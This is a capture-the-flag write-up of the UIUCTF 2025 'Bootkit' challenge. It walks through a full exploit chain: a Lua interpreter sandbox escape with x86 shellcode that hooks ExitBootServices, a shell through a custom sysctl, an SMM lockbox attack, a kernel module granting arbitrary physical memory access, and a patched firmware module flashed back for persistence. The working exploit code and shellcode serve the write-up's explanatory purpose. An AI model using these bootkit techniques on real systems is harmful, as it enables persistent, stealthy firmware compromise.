@@ -1,0 +1,582 @@
+export const title = 'UIUCTF 2025: "Bootkit"';
+export const description =
+    "Leveraging UEFI driver vulnerabilities to pwn Linux + SMM and install a bootkit.";
+
+Writeup for Bootkit, a uefi, linux, and smm full chain challenge from UIUCTF 2025. Originally posted on the smiley blog: [https://ctf.gg/blog/bootkit](https://ctf.gg/blog/bootkit), written by unvariant and [@kroot](https://kroot.me/).
+
+<hr></hr>
+
+# bootkit
+
+> It's 17 hours before the extended writeup deadline and 30 minutes after midnight. Time to do the bootkit writeup 😜.
+
+\- `@unvariant` (why am I doing this)
+
+(Also sorry in advance if I get any of the UEFI stuff wrong, my knowledge is a bit rusty...)
+
+Our team was the first blood on this challenge, but 30 minutes after the CTF ended. If we had solved just a tiny bit faster we would have gotten first instead of second place `:/`.
+![sk.png](imgs/sk.png/raw)
+
+Anyways here is the challenge:
+![desc.png](imgs/desc.png/raw)
+
+Ignoring all the fluff in the description theres a few important things to take note of:
+
+1. secret disks such that they detach themselves as soon as any keyboard input is detected
+2. the bootkit must survive the reboot
+3. TPM also hashes everything on the boot disk
+4. completely and utterly pwning the firmware... Lua.efi, but with persistance. SMM is Aleep, but with purpose.
+5. Asleep is spelled wrong.
+
+The challenge works by booting the target machine twice inside of QEMU. On the first run the encrypted flag disk is not attached, but keyboard input is allowed. On the second run the encrypted flag disk is attached, but keyboard input is not allowed. From this we can infer that we are supposed to gain a foothold in the system during the first boot and somehow backdoor the system so during the second boot it will dump the flag.
+
+The description mentions that the contents of the disk are verified by the TPM, so we can't just backdoor the initramfs of the linux kernel. The description also mentions `Lua.efi` and `SMM is Aleep` which are two previous challenges. In `Lua.efi` you gain arbitrary shellcode execution in a signed UEFI application running an embedded lua interpreter. In `SMM is Aleep` you gain arbitrary code execution in SMM by launching an attack from linux.
+
+If you take a look at the run file the argument to QEMU that provides the UEFI firmware looks like this:
+
+```text open
+  -drive if=pflash,format=raw,unit=0,file=OVMF_CODE_copy.fd \
+```
+
+![hmm.gif](imgs/hmm.gif/raw)
+
+The `readonly` attribute is missing, which means that writes to the UEFI firmware will persist across boots. Combined with the description only mentioning that the disk contents are verified, everything points to using the first boot to backdoor the UEFI firmware.
+
+## initial foothold
+
+During the first boot, the machine presents two boot options, one is an embedded lua interpreter running inside of an UEFI application and the second is an alpine linux kernel. The linux kernel has been modified to add a custom sysctl:
+
+```diff open
+From 5529f07d0e6abe6a1b0152d36ef831738058a4ad Mon Sep 17 00:00:00 2001
+From: YiFei Zhu <zhuyifei@google.com>
+Date: Tue, 8 Jul 2025 21:05:20 -0700
+Subject: [PATCH] kernel/sysctl: Create /proc/sys/kernel/run_command
+
+Just a read-only variable, nothing special yet.
+
+Signed-off-by: YiFei Zhu <zhuyifei@google.com>
+---
+ kernel/sysctl.c | 9 +++++++++
+ 1 file changed, 9 insertions(+)
+
+diff --git a/kernel/sysctl.c b/kernel/sysctl.c
+index 3b7a7308e35b..821f7235cbd4 100644
+--- a/kernel/sysctl.c
++++ b/kernel/sysctl.c
+@@ -1587,7 +1587,16 @@ int proc_do_static_key(const struct ctl_table *table, int write,
+ 	return ret;
+ }
+
++static char sysctl_run_command[100];
++
+ static const struct ctl_table kern_table[] = {
++	{
++		.procname	= "run_command",
++		.data		= &sysctl_run_command,
++		.maxlen		= sizeof(sysctl_run_command),
++		.mode		= 0400,
++		.proc_handler	= proc_dostring,
++	},
+ 	{
+ 		.procname	= "panic",
+ 		.data		= &panic_timeout,
+--
+2.50.0
+```
+
+Instead of giving a shell like normal the init script executes whatever is contained in the `run_command` sysctl and then powers off. Booting into linux normally will do nothing since `run_command` is empty and will result in an immediate reboot. Our only other option is to abuse our code execution inside of the lua interpreter to write a command into the `run_command` sysctl.
+
+## FIELD TRIP TIME
+
+![trip.jpg](imgs/trip.jpg/raw)
+
+First we need to understand how the linux image boots itself under UEFI. UEFI applications are actually just windows PE executables and is the only executable format that UEFI recognizes. The linux kernel image is wrapped inside of a loader called UKI. As far as I can tell all UKI does is embed the linux kernel and initramfs as PE sections inside of itself. Then at runtime when the application is invoked it extracts the kernel and initramfs, decompresses them, and executes the kernel as a UEFI application.
+
+What happens after the kernel gets executed is irrelevant to us. What matters is that after the kernel is decompressed it can be modified before it is actually started. However, even though we have free code execution from the lua interpreter we can't just inject a hook into the UKI loader code. The lua interpreter and UKI loader are separate options in the boot menu and only one of them will ever be loaded into memory at a time. We could have used the code execution in the lua interpreter to modify the copy of the UKI loader on the disk, but I wasn't sure if this would trip the TPM verification.
+
+Here is the code inside of the UKI loader that invokes the kernel:
+
+```c open
+if (rax_14 == EFI_SUCCESS)
+    sub_14df98e36()
+    rdi_10 = gBS->StartImage(ImageHandle: ImageHandle_1,
+        ExitDataSize: nullptr, ExitData: nullptr)
+
+    if (rdi_10 == EFI_UNSUPPORTED)
+        uint64_t rax_17 = zx.q(var_84)
+
+        if (rax_17.d != 0)
+            rdi_10 = (rax_17 + *(Interface + 0x40))(ImageHandle_1, gST)
+
+    rdx_11 = "%s:%i@%s: Error starting kernel image: %m"
+```
+
+See the `gBS` variable? That stands for Global Boot Services. The way UEFI works is by abstracting away all the nasty platform specific details into a nicely wrapped interface that you communicate with via the Global Boot Services and System Table. The Global Boot Services is a giant table of function pointers that allow UEFI applications to interact with the UEFI firmware. Turns out that in EDKII there is a single `gBS` table that is passed to every single UEFI application. This means that modification to the `gBS` will persist across applications.
+
+My idea was this:
+
+1. code execution inside lua interpreter
+2. replace `gBS->StartImage` with a pointer to custom shellcode
+3. custom shellcode is invoked after decompression but before the kernel is run
+
+Now the issue with backdooring `StartImage` is that this function is called all over the place in UEFI land. The custom shellcode would have to do some filtering to figure out when is the appropriate time to trigger the backdoored functionality. Thankfully my teammate `@kroot` suggested something they had seen from writeups about bootkits in the wild. Turns out that `gBS` hijacking is a fairly common technique except most bootkits hijack `ExitBootServices`. This makes sense because before a bootloader fully hands off execution to the kernel it must call `ExitBootServices` to signal to the UEFI firmware that the boot services are no longer necessary and can be cleaned up. This is a perfect function to hook because it is only called once and only after the kernel has been decompressed.
+
+## shell?!?!?!
+
+Now that we have figured out how to get code to run while the kernel is booting and after the kernel has been decompressed we can finally turn our attention to modifying the `run_command` sysctl. Turns out that in context we are executing in the backing memory of the `run_command` variable hasn't been mapped in yet (presumably because it resides in .bss memory). Since sysctls just contain a pointer to their data payload we can set the `run_command` sysctl to the virtual address of a kernel string in `.rodata` or `.data` and write our custom command there instead.
+
+![drum.gif](imgs/drum.gif/raw)
+
+```sh open
++ mkdir -p /proc /dev /sys /etc /mnt
++ mount -n -t proc -o nosuid,noexec,nodev proc /proc/
++ mount -n -t devtmpfs -o mode=0755,nosuid,noexec devtmpfs /dev
++ mount -n -t sysfs -o nosuid,noexec,nodev sys /sys
++ mount -n -t tmpfs -o mode=1777 tmpfs /tmp
++ mount -t efivarfs efivarfs /sys/firmware/efi/efivars
++ mount -n -t securityfs securityfs /sys/kernel/security
++ ln -s /proc/self/fd /dev/fd
++ [[ ! -e /dev/tpm0 ]]
++ [[ ! -e /dev/vda ]]
+++ dd if=/dev/vda bs=1 count=4
+/init: line 27: warning: command substitution: ignored null byte in input
++ [[ \x1f\x8b\x08 == LUKS ]]
+++ dd if=/dev/vda bs=1 count=8 skip=65600
+/init: line 32: warning: command substitution: ignored null byte in input
++ [[ \\x16\xe2\x92r\x7f\xa8 == _BHRfS_M ]]
++ echo 'Error: Disk is corrupted'
+Error: Disk is corrupted
+++ cat /proc/sys/kernel/run_command
++ [[ -n /bin/sh ]]
++ cd /root
+++ cat /proc/sys/kernel/run_command
++ exec setsid bash -lc /bin/sh
+/root #
+```
+
+![wow.jpg](imgs/wow.jpg/raw)
+
+SHELL!!!!!!! THIS IS LIKE PART 1 OF 4!!!!!!!! ITS 2 AM RIGHT NOW!!!!!
+
+Here is the lua script that overwrites the `run_command` variable:
+
+```lua open
+as_num = string.dump(function(...) for n = ..., ..., 0 do return n end end)
+as_num = as_num:gsub("\x21", "\x17", 1)
+as_num = assert(load(as_num))
+function addr_of(x) return as_num(x) * 2^1000 * 2^74 end
+function ub8(n)
+  t = {}
+  for i = 1, 8 do
+    b = n % 256
+    t[i] = string.char(b)
+    n = (n - b) / 256
+  end
+  return table.concat(t)
+end
+upval_assign = string.dump(function(...)
+  local magic
+  (function(func, x)
+    (function(func)
+      magic = func
+    end)(func)
+    magic = x
+  end)(...)
+end)
+upval_assign = upval_assign:gsub("(magic\x00\x01\x00\x00\x00\x01)\x00", "%1\x01", 1)
+upval_assign = assert(load(upval_assign))
+function make_CClosure(f, up)
+  co = coroutine.wrap(function()end)
+  offsetof_CClosure_f = 24
+  offsetof_CClosure_upvalue0 = 32
+  sizeof_TString = 24
+  offsetof_UpVal_v = 16
+  offsetof_Proto_k = 16
+  offsetof_LClosure_proto = 24
+  upval1 = ub8(addr_of(co) + offsetof_CClosure_f)
+  func1 = ub8(addr_of("\x00\x00\x00\x00\x00\x00\x00\x00") - offsetof_Proto_k) .. ub8(addr_of(upval1) + sizeof_TString - offsetof_UpVal_v)
+  upval2 = ub8(addr_of(co) + offsetof_CClosure_upvalue0)
+  func2 = func1:sub(1, 8) .. ub8(addr_of(upval2) + sizeof_TString - offsetof_UpVal_v)
+  upval_assign((addr_of(func1) + sizeof_TString - offsetof_LClosure_proto) * 2^-1000 * 2^-74, f * 2^-1000 * 2^-74)
+  upval_assign((addr_of(func2) + sizeof_TString - offsetof_LClosure_proto) * 2^-1000 * 2^-74, up)
+  return co
+end
+shellcode = "\x50\x51\x52\x53\x54\x55\x57\x56"..
+"\xb8\x18\xc0\x0e\x1e\x48\xba\x49"..
+"\x42\x49\x20\x53\x59\x53\x54\x48"..
+"\x39\x10\x74\x08\x48\x05\x00\x00"..
+"\x10\x00\xeb\xf3\x48\x8b\x40\x60"..
+"\x48\x8b\x90\xe8\x00\x00\x00\x48"..
+"\x89\x15\x17\x00\x00\x00\x48\x8d"..
+"\x15\x18\x00\x00\x00\x48\x89\x90"..
+"\xe8\x00\x00\x00\x5e\x5f\x5d\x5c"..
+"\x5b\x5a\x59\x58\xc3\x00\x00\x00"..
+"\x00\x00\x00\x00\x00\x50\x52\xb8"..
+"\x60\xcb\x60\x02\x48\xc7\xc2\xc6"..
+"\x8c\xce\x81\x48\x89\x50\x08\x5a"..
+"\x58\xff\x25\xde\xff\xff\xff\xcc"
+shellcode_addr = addr_of(shellcode)+0x18
+print(shellcode_addr)
+teemo = make_CClosure(shellcode_addr)
+teemo()
+os.exit()
+```
+
+This is the actual assembly code that gets executed:
+
+```asm open
+    BITS 64
+    DEFAULT REL
+
+_start:
+    push rax
+    push rcx
+    push rdx
+    push rbx
+    push rsp
+    push rbp
+    push rdi
+    push rsi
+
+    mov rax, 0x1e0ec018
+    mov rdx, 0x5453595320494249
+.find_system_services:
+    cmp qword [rax], rdx
+    je .found
+    add rax, 0x100000
+    jmp .find_system_services
+
+.found:
+    mov rax, qword [rax + 0x60]
+    mov rdx, qword [rax + 0xe8]
+    mov qword [rel original], rdx
+    lea rdx, [rel backdoor]
+    mov qword [rax + 0xe8], rdx
+
+    pop rsi
+    pop rdi
+    pop rbp
+    pop rsp
+    pop rbx
+    pop rdx
+    pop rcx
+    pop rax
+    ret
+original: dq 0
+backdoor:
+    push rax
+    push rdx
+
+    ;;; location of run_command sysctl structure
+    mov rax, 0xc00000 + 0x1a0cb60
+    ;;; virtual address of /bin/sh string
+    mov rdx, 0xffffffff81ce8cc6
+    mov qword [rax + 0x08], rdx
+
+    pop rdx
+    pop rax
+    jmp qword [rel original]
+```
+
+The shellcode scans for the System Table in memory by searching for the 8 byte signature `IBI SYST`. The System Table always hold a pointer to the Global Boot Services. Once the Global Boot Services has been located the `ExitBootServices` function pointer can be replaced with a pointer to the second stage of the shellcode. The second stage sets `run_command` to `/bin/sh` and executes the original `ExitBootServices` function.
+
+## pwning SMM
+
+We have gotten shell access but remember since this is first boot the disk containing the flag isn't attached to the machine. What we can do now is use our newfound shell access to run our `SMM is Aleep` attack and get SMM code execution. I'll probably release a writeup about my exact `SMM is Aleep` solution later sometime within the next year. But the gist of it is this:
+
+1. create a smm lockbox entry at the specific address `S3Resume2Pei.efi` will be loaded to when returning from S3 sleep
+2. set the `RestoreInPlace` attribute
+3. trigger S3 sleep
+4. exit S3 sleep
+5. part of `S3Resume2Pei.efi` is overwritten with our shellcode when it attempts to restore the smm lockbox contents in place
+
+Even though our shellcode is running in ring 0 and not in SMM mode, we manage to hijack execution early enough that SMRAM isn't locked down yet. This means we can still access SMRAM and the shellcode installs a backdoor inside of the smm lockbox code.
+
+## how2backdoor
+
+Since the challenge distributes a copy of the UEFI firmware running on remote, it is possible to insert a backdoor into our local copy and embed the backdoored version into the SMM exploit payload. The issue with this is that the full UEFI firmware is about `3.5M` and even when compressed is still `1.7M`. I don't want to send 1.7 megabytes of base64'd text over to remote since it would take forever and probably time out. Thankfully the author took pity on us and provided a `UEFIReplace` binary on remote for us to use. `UEFIReplace` is part of the `UEFITool` suite of tools used to perform inspection, extraction, and modification of UEFI firmware. With this our steps now look like this:
+
+1. dump firmware
+2. insert backdoored module into firmware
+3. write firmware back into flash
+
+While I was getting all the linux and smm backdoors working and consistent my teammate `@kroot` was working on figuring out how to use `UEFIReplace` and how to dump the firmware.
+
+## dumping the firmware
+
+Eventually `@kroot` figured out that reading the firmware didn't require any special privileges and can be dumped from memory. The only issue was figuring out exactly where in memory the flash was memory mapped. Snooping around in the UEFI boot debug logs yields these two lines:
+
+```text open
+VirtHstiQemuFirmwareFlashCheck: FFC00010 behaves as ROM
+VirtHstiQemuFirmwareFlashCheck: FFC84010 behaves as ROM
+```
+
+The size of the `OVMF_VARS.fd` file which is passed as one of the flash files to QEMU is exactly 0x84000 bytes. The first region probably contains `OVMF_VARS.fd` while the second region probably contains `OVMF_CODE.fd`. Dumping the second region confirmed that this was indeed the memory mapped flash region for `OVMF_CODE.fd`.
+
+## FIELD TRIP TIME AGAIN
+
+![trip2.jpg](imgs/trip2.jpg/raw)
+
+Normally with root permissions on linux the easiest way to directly access physical memory is through `/dev/mem`. The only problem is that `/dev/mem` doesn't actually give indiscriminate access to physical memory and tries to limit you to sane regions it knows are safe. But for our purposes that is not enough. We need access to regions of physical memory `/dev/mem` refuses to grant access to. There is probably a cleaner way to handle this but I ended up writing a kernel module that uses `ioremap` to grant almost arbitrary access to physical memory.
+
+> Although ioremap is less strict than `/dev/mem` it still does some filtering. I don't actually know how to map arbitrary physical memory using the linux kernel functionality. The easiest method that I know of would be to manually edit the page tables and insert new entries which instead is not ideal since it is bypassing linux's normal memory management systems.
+
+```c open
+#include <asm/io.h>
+#include <linux/fs.h>
+#include <linux/init.h>
+#include <linux/kernel.h>
+#include <linux/miscdevice.h>
+#include <linux/mm.h>
+#include <linux/module.h>
+
+typedef struct {
+  unsigned long addr;
+  void *uptr;
+  unsigned long ulen;
+} Payload;
+
+static long teemo_ioctl(struct file *file, unsigned int cmd,
+                        unsigned long arg) {
+  Payload payload;
+  if (copy_from_user(&payload, (const void *)arg, sizeof(Payload))) {
+    return -EFAULT;
+  }
+  char buf[0x2000];
+  unsigned long page = payload.addr & ~0xFFF;
+  unsigned long offset = payload.addr & 0xFFF;
+  if (payload.ulen > sizeof(buf)) {
+    return -EINVAL;
+  }
+  if (offset + payload.ulen > 0x2000) {
+    return -EINVAL;
+  }
+
+  long err = 0;
+  void *mem = ioremap(page, 0x2000);
+  if (mem == NULL) {
+    err = -EPERM;
+    goto out;
+  }
+
+  if (cmd == 1) {
+    if (copy_from_user(&buf, payload.uptr, payload.ulen)) {
+      err = -EFAULT;
+      goto out;
+    }
+
+    memcpy(mem + offset, buf, payload.ulen);
+  } else {
+    memcpy(buf, mem + offset, payload.ulen);
+    if (copy_to_user(payload.uptr, buf, payload.ulen)) {
+      err = -EFAULT;
+      goto out;
+    }
+  }
+
+out:
+  iounmap(mem);
+  return err;
+}
+
+static struct file_operations teemo_fops = {
+    .owner = THIS_MODULE,
+    .unlocked_ioctl = teemo_ioctl,
+};
+
+static struct miscdevice teemo_device = {
+    .minor = MISC_DYNAMIC_MINOR,
+    .name = "teemo",
+    .fops = &teemo_fops,
+};
+
+static int teemo_init(void) {
+  misc_register(&teemo_device);
+  return 0;
+}
+
+module_init(teemo_init);
+MODULE_LICENSE("GPL");
+```
+
+This is needed in order to access the SMMC structure to communicate with SMM code and access the memory mapped flash region.
+
+## backdooring the firmware
+
+All the firmware backdoor has to do is what the initial lua exploit was doing. We backdoor the main UEFI module that contains the code for `CoreExitBootServices`. The entrypoint of the function was modified with a trampoline that jmps to shellcode that sets the `run_command` sysctl and then transfers control back to the original `CoreExitBootServices` function. `@kroot` was in charge of handling the backdooring of the module.
+
+Hi `@kroot` here to explain the backdoor. To patch `CoreExitBootServices`, I opened DxeCore.debug to see symbols and DxeCore.efi to actually patch. I also picked a random function which was hopefully not called to store the shellcode. I patched the beginning of `CoreExitBootServices` with:
+
+```asm open
+lea rax, [rel 0x109a2]
+call rax
+```
+
+This shellcode jumps to `IoioExit`, which was patched to contain the following shellcode:
+
+```asm open
+    BITS 64
+    DEFAULT REL
+
+_start:
+    pop rax
+    push rcx
+    push rdx
+    push rbx
+    push rsp
+    push rbp
+    push rdi
+    push rsi
+
+    push rax
+
+    mov rax, cr0
+    and rax, ~(1<<16)
+    mov cr0, rax
+
+    mov rax, 0xc00000 + 0x1a0cb60
+    mov rdx, 0xc00000 + 0x1f4a6e0
+    mov rcx, 0xffffffff81f4a6e0
+    mov qword [rax + 0x08], rcx
+
+    mov rax, 0x746e6d2f20746163
+    mov qword [rdx], rax
+    mov rax, 0x00000067616c662f
+    mov qword [rdx+8], rax
+
+    pop rax
+
+    pop rsi
+    pop rdi
+    pop rbp
+    pop rsp
+    pop rbx
+    pop rdx
+    pop rcx
+
+    push rbp
+    mov rbp, rsp
+    push r13
+    push r12
+    push rdi
+
+    jmp rax
+```
+
+With the patched UEFI module, you can send it to the server and generate a patched `OVMF_CODE.fd` with:
+
+```sh open
+./UEFIReplace ../run/OVMF_CODE.fd D6A2CB7F-6A18-4E2F-B43B-9920A733700A 0x10
+```
+
+## backdoor explanation
+
+The code isn't cleaned up at all but the main part is this code:
+
+```asm open
+    ;;; address of run_command sysctl
+    mov rax, 0xc00000 + 0x1a0cb60
+    ;;; address of modprobe_path
+    mov rdx, 0xc00000 + 0x1f4a6e0
+    ;;; virtual address of modprobe_path
+    mov rcx, 0xffffffff81f4a6e0
+    ;;; set run_command payload to point to modprobe_path
+    mov qword [rax + 0x08], rcx
+
+    ;;; write the command into modprobe_path
+    ;;; the command is `cat /mnt/flag`
+    mov rax, 0x746e6d2f20746163
+    mov qword [rdx], rax
+    mov rax, 0x00000067616c662f
+    mov qword [rdx+8], rax
+```
+
+I'm pretty sure this part of the code isn't necessary and was just left over from whatever we were previously doing.
+
+```asm open
+    mov rax, cr0
+    and rax, ~(1<<16)
+    mov cr0, rax
+```
+
+## rewriting the firmware
+
+Writing to the firmware is a bit more complex than reading. First you need to be executing in SMM because flash reprogramming is only allowed from a secure context. `@kroot` figured out that internally the flash writes are managed by a state machine. While the flash supports quite a few fancy commands the easiest mode is single byte writes. The code to program a single byte of flash looks like this:
+
+```asm open
+    mov byte ptr [rdi], 0x40
+    mov byte ptr [rdi], al
+```
+
+Where `rdi` is the base of the flash memory region plus the offset into the flash. `al` contains the byte to write into the flash.
+
+Using the SMM code execution capability from `SMM is Aleep` we backdoor the smm lockbox with some custom shellcode. The shellcode accepts a 0x800 block of memory to write into the flash. Once the SMM backdoor is installed the new firmware can be painstakingly written into the flash in 0x800 byte chunks. Why 0x800 specifically? Because of the shitty code I wrote in my kernel module. The exploit would start breaking if I tried to increase the block size to 0x1000, so I halved the transfer size and called it a day.
+
+## final exploit
+
+### first boot
+
+1. boot lua interpreter
+2. shellcode execution
+3. backdoor `ExitBootServices`
+4. exit lua interpreter
+5. boot linux
+6. backdoor overwrites `run_command`
+7. load `teemo.ko` for physical memory access
+8. lockbox attack for SMM code execution
+9. dump UEFI firmware
+10. insert backdoored module into firmware
+11. write firmware back into flash
+
+### second boot
+
+1. play a game of aram
+2. watch the flag get printed
+
+### flag
+
+```text open
+uiuctf{I_have_friends_everywhere:_smm_kernel_and_userspace_53fbc31c}
+```
+
+## closing thoughts
+
+Overall I really liked the challenge, even if the vulnerabilities were quite contrived. It was fun to go though the process of building the full chain exploit, having to string everything together and making the exploit stable. After solving `Lua.efi` and `SMM is Aleep` it was pretty obvious what the solve path for `bootkit` was.
+
+WRITEUP FINISHED!!!!! IM FREEEE!!!!
+
+me rn:
+
+![tired.gif](imgs/tired.gif/raw)
+
+(its 4 am)
+
+## files
+
+```lua path="template.lua"
+
+```
+
+```asm path="stager.asm"
+
+```
+
+```c path="teemo.c"
+
+```
+
+```c path="exploit.c"
+
+```
+
+```c path="pwnc.h"
+
+```
+
+```Makefile path="Makefile"
+
+```
+
+```py path="solve.py"
+
+```
